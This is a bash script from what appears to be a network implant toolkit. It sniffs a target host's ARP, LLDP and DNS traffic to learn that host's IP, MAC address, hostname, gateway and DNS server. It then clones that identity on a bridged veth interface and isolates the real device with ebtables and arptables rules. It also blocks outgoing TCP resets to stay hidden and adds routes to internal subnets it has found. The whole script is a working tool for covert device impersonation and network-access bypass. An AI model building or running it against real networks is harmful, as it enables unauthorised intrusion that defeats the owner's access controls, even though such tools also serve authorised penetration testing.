#!/bin/bash

# --- Configuration ---
# Source shared config to inherit PCAP_DIR and other paths if available
[ -f /opt/implant/config.env ] && source /opt/implant/config.env

VETH_IN="veth0"
VETH_OUT="veth1"
BRIDGE="br0"
LISTEN_IFACE="eth2"
LOG_DIR="/opt/implant/logs/spoof-target"
LOG_FILE="${LOG_DIR}/spoof-target.log"
SUBNETS_FILE="/opt/implant/logs/traffic-analyzer/subnet-suggestions.json"
PCAP_DIR="${PCAP_DIR:-/opt/implant/logs/packet-sniffer}"
OFFLINE_PCAP_COUNT=2
LLDP_WAIT=5 # Seconds to wait after triggering LLDP before reading offline PCAPs

# --- State Variables ---
SPOOFED_IP=""
SPOOFED_MAC=""
SPOOFED_HOSTNAME=""
GATEWAY_IP=""
DNS_SERVER=""
CAPTURE_FILE=""
EXTRACT_FILE=""

# --- Option Flags ---
DO_IP_MAC=false
DO_HOSTNAME=false
DO_GATEWAY=false
DO_DNS=false
FORCE_CAPTURE=false
DEBUG=false
LAST_SPOOFED=false
LIVE_CAPTURE=false
DETECT_NET_CONFIG=false
TIMEOUT=30           # Default capture timeout (--live only)
TIMEOUT_EXPLICIT=false

# --- Functions ---

##
# Prints a debug message to stderr if DEBUG mode is enabled.
##
debug_log() {
  if $DEBUG; then
    echo "[DEBUG] $@" >&2
  fi
}

##
# Displays usage information and exits.
##
usage() {
  echo "Usage: $0 [detection options] [set options] [--live]"
  echo ""
  echo "Capture Mode:"
  echo "  (default)            Offline: analyse the last ${OFFLINE_PCAP_COUNT} PCAPs from ${PCAP_DIR}."
  echo "                       All detection options are enabled automatically unless narrowed."
  echo "  --live               Live: capture traffic on ${LISTEN_IFACE} in real time."
  echo ""
  echo "Detection Options:"
  echo "  --ip-mac             Detect the most active IP and MAC address."
  echo "  --hostname           Detect the target's hostname (via LLDP, Windows targets only)."
  echo "  --gateway            Detect the network gateway."
  echo "  --dns                Detect the DNS server."
  echo "  --all                Enable all detection options."
  echo ""
  echo "Set Options (to provide known information):"
  echo "  --set-ip <ip>        Manually set the target IP address."
  echo "  --set-mac <mac>      Manually set the target MAC address."
  echo "  --set-hostname <val> Manually set the target hostname."
  echo ""
  echo "Live-only Options (require --live):"
  echo "  --timeout <sec>      Set the capture duration (default: ${TIMEOUT}s)."
  echo "  --force              Repeat capture until all requested information is found."
  echo ""
  echo "Control Options:"
  echo "  --debug              Enable verbose debugging output."
  echo "  --help               Display this help message."
  echo ""
  echo "Restore:"
  echo "  --last-spoofed       Re-apply the last successfully applied identity from logs."
  echo "                       Skips all detection; reads IP, MAC, hostname from log."
  echo ""
  echo "Cleanup:"
  echo "  --clean              Remove all created interfaces and rules."
  exit 1
}

##
# Performs a network capture, saving relevant packets to a temporary file.
##
capture_traffic() {
  CAPTURE_FILE=$(sudo mktemp)
  # Ensure the capture file is removed on script exit
  trap 'sudo rm -f "$CAPTURE_FILE"' EXIT

  echo "[*] Starting network capture for ${TIMEOUT} seconds..."

  local capture_filter="arp or (ether proto 0x88cc) or (udp and (port 53 or port 67 or port 68 or port 137 or port 5353 or port 5355))"

  # If the trigger script exists and hostname detection has been requested, run it in the background to elicit a response
  if $DO_HOSTNAME && [ -z "$SPOOFED_HOSTNAME" ] && [ -f "/opt/implant/scripts/trigger-lldp.py" ]; then
    echo "[*] Launching LLDP trigger script in background..."
    sudo python3 /opt/implant/scripts/trigger-lldp.py &
  fi

  echo "[*] Capturing traffic... Press Ctrl+C to stop early."
  sudo tshark -q -i "${LISTEN_IFACE}" -f "${capture_filter}" -w "${CAPTURE_FILE}" -a duration:"${TIMEOUT}" 2>/dev/null

  local packets_captured
  packets_captured=$(sudo capinfos -c "$CAPTURE_FILE" | awk '{print $NF}')
  echo "[+] Capture finished. ${packets_captured} relevant packets saved."
  debug_log "Capture saved to ${CAPTURE_FILE}"
}

##
# Loads the last OFFLINE_PCAP_COUNT PCAPs from PCAP_DIR and merges them into
# a single temporary CAPTURE_FILE for analysis by the existing detect_* functions.
##
load_pcap_offline() {
  # If hostname detection is requested, trigger LLDP and wait for packets to
  # land in the packet-sniffer PCAPs before reading them.
  if $DO_HOSTNAME && [ -z "$SPOOFED_HOSTNAME" ] && [ -f "/opt/implant/scripts/trigger-lldp.py" ]; then
    echo "[*] Launching LLDP trigger (waiting ${LLDP_WAIT}s for packets to land in PCAPs)..."
    sudo python3 /opt/implant/scripts/trigger-lldp.py &
    sleep "$LLDP_WAIT"
  fi

  echo "[*] Loading last ${OFFLINE_PCAP_COUNT} PCAP(s) from ${PCAP_DIR}..."

  local pcap_list
  pcap_list=$(find "$PCAP_DIR" -maxdepth 1 -name "*.pcap*" \
    -printf '%T@ %p\n' 2>/dev/null | sort -nr | head -n "$OFFLINE_PCAP_COUNT" | awk '{print $2}')

  if [ -z "$pcap_list" ]; then
    echo "[!] No PCAP files found in ${PCAP_DIR}." >&2
    exit 1
  fi

  CAPTURE_FILE=$(sudo mktemp /tmp/spoof-target-offline-XXXXXX.pcap)
  EXTRACT_FILE=$(mktemp /tmp/spoof-target-fields-XXXXXX.tsv)
  trap 'sudo rm -f "$CAPTURE_FILE"; rm -f "$EXTRACT_FILE"' EXIT

  local count
  count=$(echo "$pcap_list" | wc -l)

  if [ "$count" -eq 1 ]; then
    sudo cp "$pcap_list" "$CAPTURE_FILE"
  else
    # mergecap combines multiple PCAPs into one chronological stream
    sudo mergecap -w "$CAPTURE_FILE" $pcap_list
  fi

  local packets_captured
  packets_captured=$(sudo capinfos -c "$CAPTURE_FILE" | awk '/Number of packets/{sub(/.*packets:[[:space:]]*/,""); print}')
  echo "[+] Loaded ${packets_captured} packets from ${count} offline PCAP(s)."
  debug_log "Merged offline PCAP: ${CAPTURE_FILE}"

  extract_all_fields
}

##
# Single tshark pass over CAPTURE_FILE extracting all fields needed by every
# detect_* function. Result is saved to EXTRACT_FILE as pipe-delimited text:
# frame.protocols | eth.src | arp.opcode | arp.src.proto_ipv4 | arp.dst.proto_ipv4 | ip.dst
# detect_* functions read EXTRACT_FILE with awk — no further PCAP access needed.
# Note: hostname detection always uses tshark -V on CAPTURE_FILE directly.
##
extract_all_fields() {
  echo "[*] Extracting fields (single pass)..."
  local tshark_stderr
  tshark_stderr=$(sudo tshark -r "$CAPTURE_FILE" \
    -Y "arp or lldp or (udp.dstport == 53 and not ip.dst == 224.0.0.251 and not ip.dst == 224.0.0.252)" \
    -T fields \
    -e frame.protocols \
    -e eth.src \
    -e arp.opcode \
    -e arp.src.proto_ipv4 \
    -e arp.dst.proto_ipv4 \
    -e ip.dst \
    -E separator="|" \
    2>&1 1>"$EXTRACT_FILE")
  debug_log "tshark stderr: ${tshark_stderr:-none}"

  local line_count
  line_count=$(wc -l < "$EXTRACT_FILE")
  if [ "$line_count" -eq 0 ]; then
    echo "[!] Single-pass extraction yielded no records." >&2
    echo "[!] The merged PCAP may be corrupt, in an unsupported format, or the tshark filter matched nothing." >&2
    echo "[!] tshark output: ${tshark_stderr}" >&2
    echo "[!] Preserving merged PCAP for manual inspection: ${CAPTURE_FILE}" >&2
    trap - EXIT  # disable cleanup so files persist
    exit 1
  fi
  echo "[+] Extracted ${line_count} relevant records."
}

##
# Detects IP and MAC address from the capture file.
##
detect_ip_mac() {
  if [ -n "$SPOOFED_IP" ] && [ -n "$SPOOFED_MAC" ]; then return; fi
  debug_log "Analyzing capture for IP/MAC..."

  local arp_replies
  if [ -n "$EXTRACT_FILE" ]; then
    # col: $3=arp.opcode, $2=eth.src, $4=arp.src.proto_ipv4
    arp_replies=$(awk -F'|' '$3 == "2" && $2 != "" && $4 != "" {print $2, $4}' "$EXTRACT_FILE")
  else
    arp_replies=$(sudo tshark -r "${CAPTURE_FILE}" -Y "arp.opcode == 2" -T fields -e eth.src -e arp.src.proto_ipv4 2>/dev/null)
  fi

  if [ -z "$arp_replies" ]; then debug_log "No ARP replies found."; return; fi

  local best_pair
  best_pair=$(echo "$arp_replies" | sort | uniq -c | sort -nr | head -n 1 | awk '{print $2, $3}')
  SPOOFED_MAC=$(echo "$best_pair" | awk '{print $1}')
  SPOOFED_IP=$(echo "$best_pair" | awk '{print $2}')
  echo "[+] Target IP/MAC detected: ${SPOOFED_IP} (${SPOOFED_MAC})"
}

##
# Detects the hostname for the previously found MAC address.
##
detect_hostname() {
  if [ -n "$SPOOFED_HOSTNAME" ]; then return; fi
  if [ -z "$SPOOFED_MAC" ]; then debug_log "Cannot detect hostname without MAC. Skipping."; return; fi
  debug_log "Analyzing capture for hostname from MAC ${SPOOFED_MAC}..."

  # Always use tshark -V on CAPTURE_FILE — field-based extraction is unreliable
  # for LLDP hostname TLVs. CAPTURE_FILE is set in both live and offline modes.
  local lldp_hostname
  lldp_hostname=$(sudo tshark -r "${CAPTURE_FILE}" -Y "lldp and eth.src == ${SPOOFED_MAC}" -V 2>/dev/null \
    | grep -E "System Name:|Chassis Subtype = Locally assigned, Id:" | head -n 1 | awk -F': ' '{print $2}')

  if [ -n "$lldp_hostname" ]; then
    SPOOFED_HOSTNAME=$(echo "$lldp_hostname" | cut -d'.' -f1)
    echo "[+] Target Hostname detected (from LLDP): ${SPOOFED_HOSTNAME}"
  fi
}

##
# Detects the gateway using a multi-layered heuristic.
##
detect_gateway() {
  if [ -n "$GATEWAY_IP" ]; then return; fi
  debug_log "Analyzing capture for Gateway using multi-layered heuristic..."

  local all_arp_ips
  if [ -n "$EXTRACT_FILE" ]; then
    # $4=arp.src.proto_ipv4, $5=arp.dst.proto_ipv4 — emit each non-empty IP on its own line
    all_arp_ips=$(awk -F'|' '{if ($4 != "") print $4; if ($5 != "") print $5}' "$EXTRACT_FILE")
  else
    all_arp_ips=$(sudo tshark -r "${CAPTURE_FILE}" -Y "arp" -T fields \
      -e arp.src.proto_ipv4 -e arp.dst.proto_ipv4 2>/dev/null | tr '\t' '\n')
  fi

  if [ -z "$all_arp_ips" ]; then return; fi

  local top_candidate
  top_candidate=$(echo "$all_arp_ips" | grep -v "^${SPOOFED_IP}$" | sort | uniq -c | sort -nr | head -n 1 | awk '{print $2}')

  if [[ "$top_candidate" =~ \.1$ || "$top_candidate" =~ \.254$ ]]; then
    debug_log "Top candidate (${top_candidate}) is a common gateway. Selecting it."
    GATEWAY_IP=$top_candidate
  else
    debug_log "Top candidate not a common gateway. Falling back to most-requested IP."
    local arp_targets
    if [ -n "$EXTRACT_FILE" ]; then
      arp_targets=$(awk -F'|' '$3 == "1" && $5 != "" {print $5}' "$EXTRACT_FILE")
    else
      arp_targets=$(sudo tshark -r "${CAPTURE_FILE}" -Y "arp.opcode == 1" -T fields \
        -e arp.dst.proto_ipv4 2>/dev/null)
    fi
    if [ -n "$arp_targets" ]; then
      GATEWAY_IP=$(echo "$arp_targets" | grep -v "^${SPOOFED_IP}$" | sort | uniq -c | sort -nr | head -n 1 | awk '{print $2}')
    fi
  fi

  if [ -n "$GATEWAY_IP" ]; then echo "[+] Gateway detected: ${GATEWAY_IP}"; fi
}

##
# [UNUSED] Detects the gateway by analyzing ARP requests in the capture file.
##
detect_gateway2() {
  if [ -n "$GATEWAY_IP" ]; then return; fi

  debug_log "Analyzing capture for Gateway..."
  local tshark_output
  tshark_output=$(sudo tshark -r "${CAPTURE_FILE}" -Y "arp.opcode==1" -T fields -e eth.src -e arp.src.proto_ipv4 -e arp.dst.proto_ipv4 2>/dev/null)

  if [ -z "$tshark_output" ]; then return; fi

  declare -A mac_dst_map
  while read -r mac src_ip dst_ip; do
    mac_dst_map["$mac"]+="$dst_ip "
  done <<< "$tshark_output"

  local best_mac=""
  local max_unique_ips=0
  for mac in "${!mac_dst_map[@]}"; do
    local unique_count
    unique_count=$(echo "${mac_dst_map[$mac]}" | tr ' ' '\n' | sort -u | wc -l)
    if (( unique_count > max_unique_ips )); then
      max_unique_ips=$unique_count
      best_mac=$mac
    fi
  done

  if [ -n "$best_mac" ]; then
    GATEWAY_IP=$(echo "$tshark_output" | awk -v mac="$best_mac" '$1 == mac { print $2; exit }')
    echo "[+] Gateway detected: ${GATEWAY_IP}"
  fi
}

##
# Detects the DNS server by analyzing DNS queries in the capture file.
##
detect_dns() {
  if [ -n "$DNS_SERVER" ]; then return; fi
  debug_log "Analyzing capture for DNS Server..."

  local dns_queries
  if [ -n "$EXTRACT_FILE" ]; then
    # $6=ip.dst — already filtered to dns-only packets by extract_all_fields
    dns_queries=$(awk -F'|' '$6 != "" {print $6}' "$EXTRACT_FILE")
  else
    dns_queries=$(sudo tshark -r "${CAPTURE_FILE}" \
      -Y "udp.dstport == 53 and not ip.dst == 224.0.0.251 and not ip.dst == 224.0.0.252" \
      -T fields -e ip.dst 2>/dev/null)
  fi

  if [ -n "$dns_queries" ]; then
    DNS_SERVER=$(echo "$dns_queries" | sort | uniq -c | sort -nr | head -n 1 | awk '{print $2}')
    echo "[+] DNS Server detected: ${DNS_SERVER}"
  fi
}

##
# Checks if all requested information has been found.
# Returns 0 if complete, 1 if not.
##
check_detection_status() {
    if $DO_IP_MAC && { [ -z "$SPOOFED_IP" ] || [ -z "$SPOOFED_MAC" ]; }; then return 1; fi
    if $DO_HOSTNAME && [ -z "$SPOOFED_HOSTNAME" ]; then return 1; fi
    if $DO_GATEWAY && [ -z "$GATEWAY_IP" ]; then return 1; fi
    if $DO_DNS && [ -z "$DNS_SERVER" ]; then return 1; fi
    # All conditions met
    return 0
}

##
# Logs the captured information to a file.
##
log_info() {
  local reason="$1"
  sudo mkdir -p "$LOG_DIR"
  {
  echo "--- Log Entry: $(date) ---"
  echo "Status: ${reason}"
  echo "  Spoofed IP:         ${SPOOFED_IP:-Not set}"
  echo "  Spoofed MAC:        ${SPOOFED_MAC:-Not set}"
  echo "  Spoofed Hostname:   ${SPOOFED_HOSTNAME:-Not set}"
  echo "  Detected Gateway:   ${GATEWAY_IP:-Not set}"
  echo "  Detected DNS:       ${DNS_SERVER:-Not set}"
  echo ""
  } | sudo tee -a "$LOG_FILE" > /dev/null
}

##
# Reads the last successfully applied identity from the log and populates
# the state variables. Exits with a clear error if no valid entry exists.
##
load_last_spoofed() {
  if [ ! -f "$LOG_FILE" ]; then
    echo "[!] No spoof-target log found at ${LOG_FILE}." >&2
    echo "[!] Run a detection first (e.g.: spoof-target --all)." >&2
    exit 1
  fi

  # Paragraph-mode awk: each blank-line-separated block is one record.
  # Finds the last block that contains "Settings applied successfully".
  local block
  block=$(awk 'BEGIN{RS=""; FS="\n"} /Settings applied successfully/{last=$0} END{print last}' "$LOG_FILE")

  if [ -z "$block" ]; then
    echo "[!] No successfully applied identity found in ${LOG_FILE}." >&2
    echo "[!] Run a detection first (e.g.: spoof-target --all)." >&2
    exit 1
  fi

  # Parse fields from the block
  SPOOFED_IP=$(      echo "$block" | grep "Spoofed IP:"       | sed 's/.*Spoofed IP:[[:space:]]*//')
  SPOOFED_MAC=$(     echo "$block" | grep "Spoofed MAC:"      | sed 's/.*Spoofed MAC:[[:space:]]*//')
  SPOOFED_HOSTNAME=$(echo "$block" | grep "Spoofed Hostname:" | sed 's/.*Spoofed Hostname:[[:space:]]*//')
  GATEWAY_IP=$(      echo "$block" | grep "Detected Gateway:" | sed 's/.*Detected Gateway:[[:space:]]*//')
  DNS_SERVER=$(      echo "$block" | grep "Detected DNS:"     | sed 's/.*Detected DNS:[[:space:]]*//')

  # Clear "Not set" placeholders so apply_spoof_config skips optional fields
  [ "$SPOOFED_HOSTNAME" = "Not set" ] && SPOOFED_HOSTNAME=""
  [ "$GATEWAY_IP"       = "Not set" ] && GATEWAY_IP=""
  [ "$DNS_SERVER"       = "Not set" ] && DNS_SERVER=""

  # IP and MAC are required; anything else is fail-safe optional
  if [ -z "$SPOOFED_IP" ] || [ "$SPOOFED_IP" = "Not set" ] || \
     [ -z "$SPOOFED_MAC" ] || [ "$SPOOFED_MAC" = "Not set" ]; then
    echo "[!] Incomplete identity in log (IP or MAC missing). Cannot restore." >&2
    exit 1
  fi

  echo "[+] Last applied identity loaded from log."

  # Set flags so display_summary_and_confirm shows all populated fields
  DO_IP_MAC=true
  [ -n "$SPOOFED_HOSTNAME" ] && DO_HOSTNAME=true
  if [ -n "$GATEWAY_IP" ] || [ -n "$DNS_SERVER" ]; then
    DETECT_NET_CONFIG=true
    [ -n "$GATEWAY_IP" ] && DO_GATEWAY=true
    [ -n "$DNS_SERVER" ] && DO_DNS=true
  fi
}

##
# Displays a summary and asks for user confirmation.
##
display_summary_and_confirm() {
  echo ""
  echo "--- Detection Summary ---"
  echo "  Spoofed IP:         ${SPOOFED_IP:-Not found}"
  echo "  Spoofed MAC:        ${SPOOFED_MAC:-Not found}"
  echo "  Spoofed Hostname:   ${SPOOFED_HOSTNAME:-Not set}"
  if $DO_GATEWAY || $DO_DNS; then
    echo "  Detected Gateway:   ${GATEWAY_IP:-Not found}"
    echo "  Detected DNS:       ${DNS_SERVER:-Not found}"
  fi
  echo "-------------------------"

  if [[ -z "$SPOOFED_IP" || -z "$SPOOFED_MAC" ]]; then
    echo "[!] Critical information (IP/MAC) could not be determined. Cannot proceed."; exit 1
  fi

  read -p "Apply these settings? (y/N): " confirm
  if [[ "$confirm" =~ ^[yY]$ ]]; then return 0; else echo "[*] User aborted."; return 1; fi
}

##
# Applies the spoofed configuration.
##
apply_spoof_config() {
  echo "[*] Applying spoofed configuration..."
  if ! ip link show "$VETH_IN" &>/dev/null; then
    sudo ip link add "$VETH_IN" type veth peer name "$VETH_OUT";
  fi

  sudo ip link set "$VETH_IN" up;
  sudo brctl addif "$BRIDGE" "$VETH_IN" 2>/dev/null
  sudo ip link set dev "$VETH_OUT" down;
  sudo ip link set dev "$VETH_OUT" address "$SPOOFED_MAC";
  sudo ip link set dev "$VETH_OUT" up
  sudo ip addr flush dev "$VETH_OUT";
  sudo ip addr add "${SPOOFED_IP}/24" dev "$VETH_OUT"

  # Prevent packets from implant from reaching the original target device
  echo "[*] Adding ebtables rule to isolate target..."
  sudo ebtables -A FORWARD -i "$VETH_IN" -o "$LISTEN_IFACE" -j DROP

  # Avoid leaking ARP replies from the implant's bridge that would conflict
  echo "[*] Adding arptables rule to prevent ARP conflicts..."
  sudo arptables -A OUTPUT -o "$BRIDGE" --opcode Reply -j DROP

  # Add iptables rule to prevent the implant from sending TCP Resets ---
  echo "[*] Adding iptables rule to block outgoing TCP RST packets..."
  sudo iptables -A OUTPUT -o veth1 -p tcp --tcp-flags RST RST -j DROP

  # Disable MAC learning on the bridge to ensure it forwards all traffic
  echo "[*] Disabling MAC address aging on bridge ${BRIDGE}..."
  sudo brctl setageing "$BRIDGE" 0

  if [ -n "$SPOOFED_HOSTNAME" ]; then
    sudo hostnamectl set-hostname "$SPOOFED_HOSTNAME"
    if ! grep -q "$SPOOFED_HOSTNAME" /etc/hosts; then
      sudo sed -i "/^127\.0\.1\.1\s\+/c\127.0.1.1\t$SPOOFED_HOSTNAME" /etc/hosts || echo -e "127.0.1.1\t$SPOOFED_HOSTNAME" | sudo tee -a /etc/hosts >/dev/null
    fi
  fi
}


##
# Cleans up created interfaces and rules.
##
cleanup() {
  echo "[*] Cleaning up spoofed network setup..."

  # Remove firewall rules
  echo "[*] Removing ebtables and arptables rules..."
  sudo ebtables -D FORWARD -i "$VETH_IN" -o "$LISTEN_IFACE" -j DROP 2>/dev/null
  sudo arptables -D OUTPUT -o "$BRIDGE" --opcode Reply -j DROP 2>/dev/null
  sudo iptables -D OUTPUT -o "${VETH_OUT}" -p tcp --tcp-flags RST RST -j DROP 2>/dev/null

  # Remove virtual interface pair
  if ip link show "$VETH_IN" &>/dev/null; then
    echo "[*] Deleting veth pair (${VETH_IN} <-> ${VETH_OUT})..."
    sudo ip link delete "$VETH_IN"
  fi

  echo "[+] Cleanup complete."
  exit 0
}

##
# Reads suggested subnets from the traffic-analyzer cache, shows them to the
# user, and optionally adds routes on VETH_OUT. Default answer is N.
##
prompt_add_subnets() {
  if [ ! -f "$SUBNETS_FILE" ]; then
    echo "[*] No subnet suggestions found (traffic-analyzer has not run yet). Skipping."
    return
  fi

  local suggestions
  suggestions=$(python3 -c "
import json, sys
try:
    data = json.load(open('$SUBNETS_FILE'))
    items = data.get('suggestions', [])
    if not items:
        sys.exit(1)
    for i, s in enumerate(items, 1):
        hint = s.get('hint', '')
        line = f\"{i}. {s['subnet']}  ({s['packets']} pkts)\"
        if hint:
            line += f'  [{hint}]'
        print(line)
except Exception as e:
    print(f'error: {e}', file=sys.stderr)
    sys.exit(1)
" 2>/dev/null)

  if [ -z "$suggestions" ]; then
    echo "[*] No RFC1918 subnets found in recent captures. Skipping."
    return
  fi

  echo ""
  echo "--- Suggested Subnets (from traffic-analyzer) ---"
  echo "$suggestions"
  echo "-------------------------------------------------"

  read -p "Add these routes via ${VETH_OUT}? (y/N): " subnet_confirm
  if [[ ! "$subnet_confirm" =~ ^[yY]$ ]]; then
    echo "[*] Skipping subnet routes."
    return
  fi

  local cidrs
  cidrs=$(python3 -c "
import json
data = json.load(open('$SUBNETS_FILE'))
for s in data.get('suggestions', []):
    print(s['subnet'])
" 2>/dev/null)

  local added=0 failed=0
  while IFS= read -r subnet; do
    [ -z "$subnet" ] && continue
    if sudo ip route add "$subnet" dev "$VETH_OUT" 2>/dev/null; then
      echo "[+] Route added: ${subnet} dev ${VETH_OUT}"
      (( added++ )) || true
    else
      echo "[!] Skipped (already exists or failed): ${subnet}"
      (( failed++ )) || true
    fi
  done <<< "$cidrs"

  echo "[+] Done: ${added} added, ${failed} skipped/failed."
}

# --- Main Execution Logic ---

# Check for essential tools
for tool in tshark ip brctl ebtables arptables hostnamectl timeout awk capinfos; do
  if ! command -v "$tool" &> /dev/null; then echo "[!] Tool '${tool}' not found." >&2; exit 1; fi
done

# Parsing arguments
while [ "$#" -gt 0 ]; do
    case "$1" in
        --ip-mac) DO_IP_MAC=true; shift;;
        --hostname) DO_HOSTNAME=true; shift;;
        --gateway) DO_GATEWAY=true; shift;;
        --dns) DO_DNS=true; shift;;
        --all) DO_IP_MAC=true; DO_HOSTNAME=true; DO_GATEWAY=true; DO_DNS=true; shift;;
        
        --set-ip) SPOOFED_IP="$2"; shift 2;;
        --set-mac) SPOOFED_MAC="$2"; shift 2;;
        --set-hostname) SPOOFED_HOSTNAME="$2"; shift 2;;

        --live) LIVE_CAPTURE=true; shift;;
        --timeout) TIMEOUT="$2"; TIMEOUT_EXPLICIT=true; shift 2;;
        --force) FORCE_CAPTURE=true; shift;;
        --last-spoofed) LAST_SPOOFED=true; shift;;
        --clean) cleanup;;
        --help) usage;;
        --debug) DEBUG=true; shift;;
        *) echo "[!] Error: Unknown or unexpected argument '$1'." >&2; usage;;
    esac
done

# Offline mode requires mergecap (checked here after args are parsed)
if ! $LIVE_CAPTURE && ! $LAST_SPOOFED; then
  if ! command -v mergecap &> /dev/null; then echo "[!] Tool 'mergecap' not found (required for offline mode)." >&2; exit 1; fi
fi

# Validate options and resolve defaults
if ! $LAST_SPOOFED; then
  # --timeout and --force are live-only
  if ! $LIVE_CAPTURE; then
    if $TIMEOUT_EXPLICIT; then echo "[!] --timeout requires --live." >&2; exit 1; fi
    if $FORCE_CAPTURE;    then echo "[!] --force requires --live." >&2;   exit 1; fi
    # Default to full detection when no flags specified in offline mode
    if ! $DO_IP_MAC && ! $DO_HOSTNAME && ! $DO_GATEWAY && ! $DO_DNS && \
       [ -z "$SPOOFED_IP" ] && [ -z "$SPOOFED_MAC" ]; then
      DO_IP_MAC=true; DO_HOSTNAME=true; DO_GATEWAY=true; DO_DNS=true
    fi
  fi

  if [ -z "$SPOOFED_IP" ] && [ -z "$SPOOFED_MAC" ] && ! $DO_IP_MAC; then
    echo "[!] Error: You must either detect (--ip-mac) or provide (--set-ip/--set-mac) the target's identity." >&2
    usage
  fi
fi

# --- Execution Flow ---
run_detection_cycle() {
    # Only load/capture if there is something left to detect
    if ( $DO_IP_MAC && ([ -z "$SPOOFED_IP" ] || [ -z "$SPOOFED_MAC" ]) ) || \
       ( $DO_HOSTNAME && [ -z "$SPOOFED_HOSTNAME" ] ) || \
       ( $DO_GATEWAY && [ -z "$GATEWAY_IP" ] ) || \
       ( $DO_DNS && [ -z "$DNS_SERVER" ] ); then
        if $LIVE_CAPTURE; then
            capture_traffic
        else
            load_pcap_offline
        fi
        if $DO_IP_MAC;   then detect_ip_mac;   fi
        if $DO_HOSTNAME; then detect_hostname; fi
        if $DO_GATEWAY;  then detect_gateway;  fi
        if $DO_DNS;      then detect_dns;      fi
    else
        debug_log "All requested information was provided manually. Skipping capture."
    fi
}

# Load from log or run live detection
if $LAST_SPOOFED; then
    load_last_spoofed
else
    # Run the first detection cycle
    run_detection_cycle

    # If in --force mode, loop until all requested information is found
    if $FORCE_CAPTURE; then
        while ! check_detection_status; do
            echo "[*] Some information is still missing. Retrying capture..."
            run_detection_cycle
        done
        echo "[+] All requested information has been found!"
    fi
fi

if display_summary_and_confirm; then
  apply_spoof_config
  log_info "Settings applied successfully."
  prompt_add_subnets
else
  log_info "User aborted; settings not applied."
  exit 1
fi

exit 0